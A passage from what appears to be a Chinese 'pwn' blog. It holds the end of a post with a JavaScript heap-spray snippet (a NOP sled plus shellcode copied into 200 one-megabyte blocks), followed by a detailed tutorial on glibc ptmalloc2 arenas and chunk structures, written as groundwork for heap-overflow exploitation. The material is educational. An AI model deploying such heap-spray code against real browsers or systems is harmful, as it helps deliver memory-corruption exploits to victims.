<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">var nop=unescape(&quot;%u9090%u9090&quot;);</div><div class="line">while (nop.length &lt;= 0x100000/2)</div><div class="line">&#123;</div><div class="line">    nop += nop;</div><div class="line">&#125;//生成一个1MB充满0x90的数据块</div><div class="line"></div><div class="line">nop = nop.substring(0, 0x100000/2 -32/2 -4/2 -shellcode.length -2/2);</div><div class="line">var slide = new Arrat();</div><div class="line">for (var i=0; i &lt; 200; i++)</div><div class="line">&#123;</div><div class="line">    slide[i] = nop + shellcode;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>每个内存片1MB</li>
<li>首先产生一个1MB且全为0x90的内存块</li>
<li>JavaScript会添加一些额外信息，得减去。堆块信息 32字节； 字符串长度 4字节； 结束符 2个字节的NULL</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/10/pwn/Linux堆内存管理深入分析上/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Introspelliam">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/09/10/pwn/Linux堆内存管理深入分析上/" itemprop="url">Linux堆内存管理深入分析上</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-10T11:02:06+08:00">
                2017-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h3><p>近年来，漏洞挖掘越来越火，各种漏洞挖掘、利用的分析文章层出不穷。从大方向来看，主要有基于栈溢出的漏洞利用和基于堆溢出的漏洞利用两种。国内关于栈溢出的资料相对较多，这里就不累述了，但是关于堆溢出的漏洞利用资料就很少了。鄙人以为主要是堆溢出漏洞的门槛较高，需要先吃透相应操作系统的堆内存管理机制，而这部分内容一直是一个难点。因此本系列文章主要从Linux系统堆内存管理机制出发，逐步介绍诸如基本堆溢出漏洞、基于unlink的堆溢出漏洞利用、double free、use-after-free等等常见的堆溢出漏洞利用技术。</p>
<p>前段时间偶然学习了这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>
<p>该文是我近段时间以来读到的最好文章之一，文章浅显易懂，条例清晰，作为初学者的我从中学到了很多linux堆内存管理相关的知识。但是估计由于篇幅的限制，该文对很多难点一带而过，造成部分知识点理解上的困难。因此我决定以该文为蓝本，结合其他参考资料和自己的理解，写一篇足够详细、完整的linux堆管理介绍文章，希冀能够给其他初学者献上微末之力。所以就内容来源而言，本文主要由两部分组成：一部分是翻译的上面提及的文章；另一部分是笔者结合其他参考资料和自己的理解添加的补充说明。鉴于笔者知识能力上的不足，如有问题欢迎各位大牛斧正！</p>
<p>同样的，鉴于篇幅过长，我将文章分成了上下两部分，上部分主要介绍堆内存管理中的一些基本概念以及相互关系，同时也着重介绍了堆中chunk分配和释放策略中使用到的隐式链表技术。后半部分主要介绍glibc malloc为了提高堆内存分配和释放的效率，引入的显示链表技术，即binlist的概念和核心原理。其中使用到的源码在：</p>
<p><a href="https://github.com/sploitfun/lsploits/tree/master/glibc" target="_blank" rel="external">https://github.com/sploitfun/lsploits/tree/master/glibc</a></p>
<p><a href="/others/files/malloc.c">malloc.c源码</a>。</p>
<h3 id="1、堆的介绍"><a href="#1、堆的介绍" class="headerlink" title="1、堆的介绍"></a>1、堆的介绍</h3><p>（1）堆在内存空间中不一定连续</p>
<p>（2）堆可由用户管理</p>
<p>常见的分配堆的方式：</p>
<ul>
<li>dlmalloc : general purpose allocator</li>
<li><font color="#f00">ptmalloc2 : glibc</font></li>
<li>jemalloc : FreeBSD 、Firefox and Android</li>
<li>tcmalloc : Google Chrome</li>
<li>libumem : Solaris</li>
</ul>
<p>本文主要学习介绍在linux glibc使用的ptmalloc2实现原理。</p>
<p>本来linux默认的是dlmalloc，但是由于其不支持多线程堆管理，所以后来被支持多线程的prmalloc2代替了。</p>
<p>当然在linux平台*malloc本质上都是通过系统调用brk或者mmap实现的。关于这部分内容，<strong>一定要学习下面</strong>这篇文章：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a></p>
<p> 鉴于篇幅，本文就不加以详细说明了，只是为了方便后面对堆内存管理的理解，截取其中函数调用关系图：</p>
<p><img src="/images/2017-09-10/41u4qg499890.png" alt="函数调用关系图"></p>
<p>系统内存分布图：</p>
<p><img src="/images/2017-09-10/41u4qk4f6q40.png" alt="系统内存分布图"></p>
<h3 id="2、实验演示"><a href="#2、实验演示" class="headerlink" title="2、实验演示"></a>2、实验演示</h3><p>试想有如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Per thread arena example. */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</div><div class="line">        getchar();</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">pthread_t</span> t1;</div><div class="line">        <span class="keyword">void</span>* s;</div><div class="line">        <span class="keyword">int</span> ret;</div><div class="line">        <span class="keyword">char</span>* addr;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        <span class="built_in">free</span>(addr);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</div><div class="line">        getchar();</div><div class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        ret = pthread_join(t1, &amp;s);</div><div class="line">        <span class="keyword">if</span>(ret)</div><div class="line">        &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面我们依次分析其各个阶段的堆内存分布状况。</p>
<h4 id="2-1-Before-malloc-in-main-thread"><a href="#2-1-Before-malloc-in-main-thread" class="headerlink" title="2.1 Before malloc in main thread"></a>2.1 Before malloc in main thread</h4><p>在程序调用malloc之前程序进程中是没有heap segment的，并且在创建在创建线程前，也是没有线程堆栈的。</p>
<h4 id="2-2-After-malloc-in-main-thread"><a href="#2-2-After-malloc-in-main-thread" class="headerlink" title="2.2 After malloc in main thread"></a>2.2 After malloc in main thread</h4><p>在主线程中调用malloc之后，就会发现系统给程序分配了堆栈，且这个堆栈刚好在数据段之上：</p>
<p><img src="/images/2017-09-10/v2-5721084ff178629469e27bc4f386bb09_b.png" alt=""></p>
<p>这就说明它是通过brk系统调用实现的。并且，还可以看出虽然我们只申请了1000字节的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做arena，此时因为是主线程分配的，所以叫做main arena(每个arena中含有多个chunk，这些chunk以链表的形式加以组织)。由于132KB比1000字节大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。</p>
<h4 id="2-3-After-free-in-main-thread"><a href="#2-3-After-free-in-main-thread" class="headerlink" title="2.3 After free in main thread"></a>2.3 After free in main thread</h4><p>在主线程调用free之后：从内存布局可以看出程序的堆空间并没有被释放掉，原来调用free函数释放已经分配了的空间并非直接“返还”给系统，而是由glibc 的malloc库函数加以管理。它会将释放的chunk添加到main arenas的bin(这是一种用于存储同类型free chunk的双链表数据结构，后问会加以详细介绍)中。在这里，记录空闲空间的freelist数据结构称之为bins。之后当用户再次调用malloc申请堆空间的时候，glibc malloc会先尝试从bins中找到一个满足要求的chunk，如果没有才会向操作系统申请新的堆空间。如下图所示：</p>
<p><img src="/images/2017-09-10/v2-bf8b91202e341b07c0b7500dff5c0bb7_b.png" alt=""></p>
<h4 id="2-4-Before-malloc-in-thread1"><a href="#2-4-Before-malloc-in-thread1" class="headerlink" title="2.4 Before malloc in thread1"></a>2.4 Before malloc in thread1</h4><p>在thread1调用malloc之前：从输出结果可以看出thread1中并没有heap segment，但是此时thread1自己的栈空间已经分配完毕了：</p>
<p><img src="/images/2017-09-10/v2-b16ccca0d60949c38b4873463bed752c_b.png" alt=""></p>
<h4 id="2-5-After-malloc-in-thread1"><a href="#2-5-After-malloc-in-thread1" class="headerlink" title="2.5 After malloc in thread1"></a>2.5 After malloc in thread1</h4><p>在thread1调用malloc之后：从输出结果可以看出thread1的heap segment已经分配完毕了，同时从这个区域的起始地址可以看出，它并不是通过brk分配的，而是通过mmap分配，因为它的区域为b7500000-b7600000共1MB，并不是同程序的data segment相邻。同时，我们还能看出在这1MB中，根据内存属性分为了2部分：0xb7500000-0xb7521000共132KB大小的空间是可读可写属性；后面的是不可读写属性。原来，这里只有可读写的132KB空间才是thread1的堆空间，即thread1 arena。</p>
<p><img src="/images/2017-09-10/v2-4fdb53e52451ec6fa9f589427f6808b4_b.png" alt=""></p>
<h4 id="2-6-在thread1调用free之后：同main-thread。"><a href="#2-6-在thread1调用free之后：同main-thread。" class="headerlink" title="2.6 在thread1调用free之后：同main thread。"></a>2.6 在thread1调用free之后：同main thread。</h4><h3 id="3、Arena介绍"><a href="#3、Arena介绍" class="headerlink" title="3、Arena介绍"></a>3、Arena介绍</h3><h4 id="3-1-Arena数量限制"><a href="#3-1-Arena数量限制" class="headerlink" title="3.1 Arena数量限制"></a>3.1 Arena数量限制</h4><p>在第2章中我们提到main thread和thread1有自己独立的arena，那么是不是无论有多少个线程，每个线程都有自己独立的arena呢？答案是否定的。事实上，arena的个数是跟系统中处理器核心个数相关的，如下表所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">For 32 bit systems:</div><div class="line">     Number of arena = 2 * number of cores + 1.</div><div class="line">For 64 bit systems:</div><div class="line">     Number of arena = 8 * number of cores + 1.</div></pre></td></tr></table></figure>
<h4 id="3-2-多Arena的管理"><a href="#3-2-多Arena的管理" class="headerlink" title="3.2 多Arena的管理"></a>3.2 多Arena的管理</h4><p>假设有如下情境：一台只含有一个处理器核心的PC机安装有32位操作系统，其上运行了一个多线程应用程序，共含有4个线程——主线程和三个用户线程。显然线程个数大于系统能维护的最大arena个数（2*核心数 + 1= 3），那么此时glibc malloc就需要确保这4个线程能够正确地共享这3个arena，那么它是如何实现的呢？</p>
<p>当主线程首次调用malloc的时候，glibc malloc会直接为它分配一个main arena，而不需要任何附加条件。</p>
<p>当用户线程1和用户线程2首次调用malloc的时候，glibc malloc会分别为每个用户线程创建一个新的thread arena。此时，各个线程与arena是一一对应的。但是，当用户线程3调用malloc的时候，就出现问题了。因为此时glibc malloc能维护的arena个数已经达到上限，无法再为线程3分配新的arena了，那么就需要重复使用已经分配好的3个arena中的一个(main arena, arena 1或者arena 2)。那么该选择哪个arena进行重复利用呢？</p>
<p>1)首先，glibc malloc循环遍历所有可用的arenas，在遍历的过程中，它会尝试lock该arena。如果成功lock(该arena当前对应的线程并未使用堆内存则表示可lock)，比如将main arena成功lock住，那么就将main arena返回给用户，即表示该arena被线程3共享使用。</p>
<p>2)而如果没能找到可用的arena，那么就将线程3的malloc操作阻塞，直到有可用的arena为止。</p>
<p>3)现在，如果线程3再次调用malloc的话，glibc malloc就会先尝试使用最近访问的arena(此时为main arena)。如果此时main arena可用的话，就直接使用，否则就将线程3阻塞，直到main arena再次可用为止。</p>
<p>这样线程3与主线程就共享main arena了。至于其他更复杂的情况，以此类推。</p>
<h3 id="4、堆管理介绍"><a href="#4、堆管理介绍" class="headerlink" title="4、堆管理介绍"></a>4、堆管理介绍</h3><h4 id="4-1-整体介绍"><a href="#4-1-整体介绍" class="headerlink" title="4.1 整体介绍"></a>4.1 整体介绍</h4><p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ol>
<li>heap_info: 即Heap Header，因为一个<strong>thread arena</strong>（注意：不包含<strong>main thread</strong>）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。那么在什么情况下一个thread arena会包含多个heaps呢?在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></div><div class="line">&#123;</div><div class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></div><div class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></div><div class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></div><div class="line">                           PROT_READ|PROT_WRITE.  */</div><div class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></div><div class="line">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</div><div class="line">     MALLOC_ALIGNMENT. */</div><div class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</div><div class="line">&#125; heap_info;</div></pre></td></tr></table></figure>
<ol start="2">
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍):</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/* Serialize access.  */</span></div><div class="line">  <span class="keyword">mutex_t</span> mutex;</div><div class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></div><div class="line">  <span class="keyword">int</span> flags;</div><div class="line">  <span class="comment">/* Fastbins */</span></div><div class="line">  mfastbinptr fastbinsY[NFASTBINS];</div><div class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></div><div class="line">  mchunkptr top;</div><div class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></div><div class="line">  mchunkptr last_remainder;</div><div class="line">  <span class="comment">/* Normal bins packed as described above */</span></div><div class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</div><div class="line">  <span class="comment">/* Bitmap of bins */</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</div><div class="line">  <span class="comment">/* Linked list */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></div><div class="line">  <span class="comment">/* Linked list for free arenas.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></div><div class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></div><div class="line">  INTERNAL_SIZE_T system_mem;</div><div class="line">  INTERNAL_SIZE_T max_system_mem;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ol start="3">
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></div><div class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></div><div class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></div><div class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></div><div class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>可能有很多读者会疑惑：该结构体里面并没有一个类似于data的字段来表示用户申请到的堆内存空间啊？且该结构体明确含有2个size_t类型的成员，4个指针，这不就意味着malloc_chunk的大小是固定的了么？那它又如何能够根据用户的请求分配不同大小的内存呢？要想回答清楚这个问题，需要我们完全理解整个glibc malloc的堆内存管理机制，同时，本文的主要目的之一就是希冀解释清楚这个概念，鉴于这部分内容较多，我将在后文的第5章加以详细介绍。</p>
<p><strong>NOTE:</strong></p>
<p>1.Main thread不含有多个heaps所以也就不含有heap_info结构体。当需要更多堆空间的时候，就通过扩展sbrk的heap segment来获取更多的空间，直到它碰到内存mapping区域为止。</p>
<p>2.不同于thread arena，main arena的arena header并不是sbrk heap segment的一部分，而是一个全局变量！因此它属于libc.so的data segment。</p>
<h4 id="4-2-heap-segment与arena关系"><a href="#4-2-heap-segment与arena关系" class="headerlink" title="4.2 heap segment与arena关系"></a>4.2 heap segment与arena关系</h4><p>首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。</p>
<p>下图是只有一个heap segment的main arena和thread arena的内存分布图：</p>
<p><img src="/images/2017-09-10/v2-cdc4b19aeb0c5bd01d24589c303f5d3b_b.png" alt=""></p>
<p>图4-1 只含一个heap segment的main arena与thread arena图</p>
<p>下图是一个thread arena中含有多个heap segments的情况：</p>
<p><img src="/images/2017-09-10/v2-d1ef4f85211061232d4397f4929e8e91_b.png" alt=""></p>
<p>图4-2 一个thread arena含有多个heap segments的内存分布图</p>
<p>从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。</p>
<h3 id="5、对chunk的理解"><a href="#5、对chunk的理解" class="headerlink" title="5、对chunk的理解"></a>5、对chunk的理解</h3><p>在glibc malloc中将整个堆内存空间分成了连续的、大小不一的chunk，即对于堆内存管理而言chunk就是最小操作单位。Chunk总共分为4类：</p>
<p>1)allocated chunk;</p>
<p> 2)free chunk; </p>
<p>3)top chunk;</p>
<p> 4)Last remainder chunk。</p>
<p>从本质上来说，所有类型的chunk都是内存中一块连续的区域，只是通过该区域中<strong>特定位置的某些标识符</strong>加以区分。为了简便，我们先将这4类chunk简化为2类：allocated chunk以及free chunk，前者表示已经分配给用户使用的chunk，后者表示未使用的chunk。</p>
<p>众所周知，无论是何种堆内存管理器，其完成的核心目的都是能够高效地分配和回收内存块(chunk)。因此，它需要设计好相关算法以及相应的数据结构，而数据结构往往是根据算法的需要加以改变的。既然是算法，那么算法肯定有一个优化改进的过程，所以本文将根据堆内存管理器的演变历程，逐步介绍在glibc malloc中chunk这种数据结构是如何设计出来的，以及这样设计的优缺点。</p>
<p>PS:鉴于时间和精力有限，后文介绍的演变历程并没有加以严格考证，笔者只是按照一些参考书籍、自己的理解以及便于文章内容安排做出的“善意的捏造”，如有错误，欢迎大家斧正！</p>
<h4 id="5-1-隐式链表技术"><a href="#5-1-隐式链表技术" class="headerlink" title="5.1 隐式链表技术"></a>5.1 隐式链表技术</h4><p>前文说过，任何堆内存管理器都是以chunk为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为chunk的一部分嵌入到chunk内部，典型的设计如下所示：</p>
<p><img src="/images/2017-09-10/v2-7e0628272e1bf28e38bc99849774c0c9_b.png" alt=""></p>
<p>图5-1 简单的allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-f092bde1862553448676a9adc97d6de3_b.png" alt=""></p>
<p>图5-2 简单的free chunk格式</p>
<p><font color="#f00">堆内存中要求每个chunk的大小必须为8的整数倍，因此chunk size的后3位是无效的，为了充分利用内存，堆管理器将这3个比特位用作chunk的标志位，典型的就是将第0比特位用于标记该chunk是否已经被分配。</font>这样的设计很巧妙，因为我们只要获取了一个指向chunk size的指针，就能知道该chunk的大小，即确定了此chunk的边界，且利用chunk size的第0比特位还能知道该chunk是否已经分配，这样就成功地将各个chunk区分开来。注意在allocated chunk中padding部分主要是用于地址对齐的(也可用于对付外部碎片)，即让整个chunk的大小为8的整数倍。</p>
<p>通过上面的设计，我们就能将整个堆内存组织成一个连续的已分配或未分配chunk序列:</p>
<p><img src="/images/2017-09-10/v2-df2d5bd535e5a00382d4647c0a900109_b.png" alt=""></p>
<p>图5-3 简单的chunk序列</p>
<p>上面的这种结构就叫做隐式链表。该链表隐式地由每个chunk的size字段链接起来，在进行分配操作的时候，堆内存管理器可以通过遍历整个堆内存的chunk，分析每个chunk的size字段，进而找到合适的chunk。</p>
<p>细心的读者可能发现：这种隐式链表效率其实是相当低的，特别是在内存回收方面，它难以进行相邻多个free chunk的合并操作。我们知道，如果只对free chunk进行分割，而不进行合并的话，就会产生大量小的、无法继续使用的内部碎片，直至整个内存消耗殆尽。因此堆内存管理器设计了带边界标记的chunk合并技术。</p>
<h5 id="5-1-1-带边界标记的合并技术"><a href="#5-1-1-带边界标记的合并技术" class="headerlink" title="5.1.1.带边界标记的合并技术"></a>5.1.1.带边界标记的合并技术</h5><p>试想如下场景：假设我们要释放的chunk为P，它紧邻的前一个chunk为FD，紧邻的后一个chunk为BK，且BK与FD都为free chunk。将P于BK合并在一起是很容易的，因为可以通过P的size字段轻松定位到BK的开始位置，进而获取BK的size等等，但是将P于FD合并却很难，我们必须从头遍历整个堆，找到FD，然后加以合并，这就意味着每次进行chunk释放操作消耗的时间与堆的大小成线性关系。为了解决这个问题，Knuth提出了一种聪明而通用的技术——边界标记。</p>
<p>Knuth在每个chunk的最后添加了一个脚部(Footer)，它就是该chunk 头部(header)的一个副本，我们称之为边界标记：</p>
<p><img src="/images/2017-09-10/v2-d31eb1d32944769bdd5477f3d277d7fd_b.png" alt=""></p>
<p>图5-4 改进版的chunk格式之Knuth边界标记</p>
<p>显然每个chunk的脚部都在其相邻的下一个chunk的头部的前4个字节处。通过这个脚部，堆内存管理器就可以很容易地得到前一个chunk的起始位置和分配状态，进而加以合并了。</p>
<p>但是，边界标记同时带来了一个问题：它要求每个块都包含一个头部和脚部，如果应用程序频繁地进行小内存的申请和释放操作的话(比如1，2个字节)，就会造成很大的性能损耗。同时，考虑到只有在对free chunk进行合并的时候才需要脚部，也就是说对于allocated chunk而言它并不需要脚部，因此我们可以对这个脚部加以优化——将前一个chunk的已分配/空闲标记位存储在当前chunk的size字段的第1，或2比特位上，这样如果我们通过当前chunk的size字段知道了前一个chunk为free chunk，那么就可得出结论：当前chunk地址之前的4个字节为前一个free chunk的脚部，我们可以通过该脚部获取前一个chunk的起始位置；如果当前chunk的size字段的标记位表明前一个chunk是allocated chunk的话，那么就可得出另一个结论：前一个chunk没有脚部，即当前chunk地址之前的4个字节为前一个allocated chunk的payload或padding的最后部分。新的chunk格式图如下：</p>
<p><img src="/images/2017-09-10/v2-0eadd69a889223eafc585134de13d866_b.png" alt=""></p>
<p>图5-5 改进版的Knuth边界标记allocated chunk格式</p>
<p><img src="/images/2017-09-10/v2-83f58d72c5b960bd72603c4a94477744_b.png" alt=""></p>
<p>图5-6 改进版的Knuth边界标记free chunk格式</p>
<h5 id="5-1-2-再进化——支持多线程"><a href="#5-1-2-再进化——支持多线程" class="headerlink" title="5.1.2.再进化——支持多线程"></a>5.1.2.再进化——支持多线程</h5><p>随着技术的发展，特别是堆内存管理器添加对多线程的支持，前述的chunk格式已经难以满足需求，比如，我们需要标志位来标记当前chunk是否属于非主线程即thread arena，以及该chunk由mmap得来还是通过brk实现等等。但此时chunk size只剩下一个比特位未使用了，怎么办呢？这需要对chunk格式进行大手术！</p>
